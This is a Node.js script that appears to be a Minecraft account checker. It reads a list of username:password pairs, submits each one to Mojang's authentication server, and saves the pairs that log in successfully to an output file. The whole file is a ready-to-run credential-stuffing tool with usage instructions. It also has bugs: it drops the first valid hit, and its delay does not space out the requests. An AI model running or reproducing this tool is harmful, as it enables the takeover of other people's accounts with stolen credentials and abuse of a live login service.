//Dependencies
const Request = require("request")
const Delay = require("delay")
const Fs = require("fs")

//Variables
const Self_Args = process.argv.slice(2)

//Functions
async function Initiate_A_Request(username, password){
    await Delay(1000)

    Request.post("https://authserver.mojang.com/authenticate", {
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ "agent": { "name": "Minecraft" }, "username": username, "password": password })
    }, function(err, res, body){
        if(err){
            console.log(`Invalid account ${username}:${password}`)
            return
        }

        if(body.indexOf("errorMessage") != -1){
            console.log(`Invalid account ${username}:${password}`)
        }else{
            const data = Fs.readFileSync(Self_Args[1], "utf8")

            if(data.length == 0){
                Fs.writeFileSync(Self_Args[1], data, "utf8")
            }else{
                Fs.writeFileSync(Self_Args[1], `${data}\n${username}:${password}`, "utf8")
            }

            console.log(`Valid account ${username}:${password}`)
        }
    })
}

//Main
if(!Self_Args.length){
    console.log(`node index.js <input> <output>
Example: node index.js accounts.txt output.txt`)
    process.exit()
}

if(!Self_Args[0]){
    console.log("Invalid input.")
    process.exit()
}

if(!Self_Args[1]){
    console.log("Invalid output.")
    process.exit()
}

if(!Fs.existsSync(Self_Args[0])){
    console.log("Invalid input.")
    process.exit()
}

Fs.writeFileSync(Self_Args[1], "", "utf8")

const Accounts = Fs.readFileSync(Self_Args[0], "utf8").split("\n")

if(Accounts.length == 0){
    console.log("No accounts found in the file.")
    process.exit()
}

for( i in Accounts ){
    Initiate_A_Request(Accounts[i].split(":")[0], Accounts[i].split(":")[1])
}
